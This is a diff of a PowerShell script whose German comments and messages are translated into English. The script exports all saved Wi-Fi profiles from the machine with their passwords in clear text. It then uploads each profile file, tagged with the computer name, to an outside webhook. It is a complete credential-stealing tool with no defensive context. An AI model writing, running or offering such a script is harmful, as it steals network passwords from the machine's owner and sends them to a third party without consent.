@@ -1,51 +1,51 @@
-# Export-Verzeichnis
+# Export directory
 $exportDir = "$env:temp\SomeStuff"
 
-# Sicherstellen, dass das Exportverzeichnis existiert
+# Ensure that the export directory exists
 if (-not (Test-Path $exportDir)) {
     try {
         New-Item -ItemType Directory -Path $exportDir -Force
     } catch {
-        Write-Host "Fehler beim Erstellen des Exportverzeichnisses: $_"
+        Write-Host "Error while creating the export directory: $_"
         return
     }
 }
 
-# WLAN-Profile exportieren (inkl. Schlüssel)
+# Export Wi-Fi profiles (including keys)
 try {
     netsh wlan export profile key=clear folder=$exportDir
 } catch {
-    Write-Host "Fehler beim Exportieren der WLAN-Profile: $_"
+    Write-Host "Error while exporting Wi-Fi profiles: $_"
     return
 }
 
-# Alle exportierten XML-Dateien lesen
+# Read all exported XML files
 $xmlFiles = Get-ChildItem -Path $exportDir -Filter "*.xml"
 if ($xmlFiles.Count -eq 0) {
-    Write-Host "Keine exportierten WLAN-Profile gefunden."
+    Write-Host "No exported Wi-Fi profiles found."
     return
 }
 
-# Webhook-Anfrage mit Datei-Upload
+# Webhook request with file upload
 foreach ($xmlFile in $xmlFiles) {
     $fileContent = Get-Content -Path $xmlFile.FullName -Raw
 
-    # Bereite die Daten vor
+    # Prepare the data
     $formData = @{
         "username" = "$env:COMPUTERNAME"
-        "content"  = "Hier ist das WLAN-Profil: $($xmlFile.Name)"
+        "content"  = "Here is the Wi-Fi profile: $($xmlFile.Name)"
     }
 
     $formDataFiles = @{
         "file" = New-Object System.IO.FileInfo($xmlFile.FullName)
     }
 
-    # Setze Header für multipart/form-data
+    # Set header for multipart/form-data
     $boundary = [System.Guid]::NewGuid().ToString()
     $contentType = "multipart/form-data; boundary=$boundary"
     $body = ""
 
-    # Füge die Daten hinzu
+    # Add the data
     foreach ($key in $formData.Keys) {
         $body += "--$boundary`r`n"
         $body += "Content-Disposition: form-data; name=`"$key`"`r`n"
@@ -53,7 +53,7 @@ foreach ($xmlFile in $xmlFiles) {
         $body += "$($formData[$key])`r`n"
     }
 
-    # Füge die Datei hinzu
+    # Add the file
     $body += "--$boundary`r`n"
     $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$($formDataFiles['file'].Name)`"`r`n"
     $body += "Content-Type: application/octet-stream`r`n"
@@ -62,17 +62,17 @@ foreach ($xmlFile in $xmlFiles) {
     $body += "`r`n"
     $body += "--$boundary--`r`n"
 
-    # Wandeln Sie den Body in Byte-Daten um
+    # Convert the body into byte data
     $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
 
-    # Senden Sie die Anfrage
+    # Send the request
     try {
         $response = Invoke-RestMethod -Uri $whuri -Method Post -Body $bodyBytes -Headers @{
             "Content-Type" = $contentType
         }
-        Write-Host "Erfolgreich an den Webhook gesendet: $($xmlFile.Name)"
+        Write-Host "Successfully sent to the webhook: $($xmlFile.Name)"
     } catch {
-        Write-Host "Fehler beim Senden an den Webhook: $_"
+        Write-Host "Error while sending to the webhook: $_"
     }
 }
 
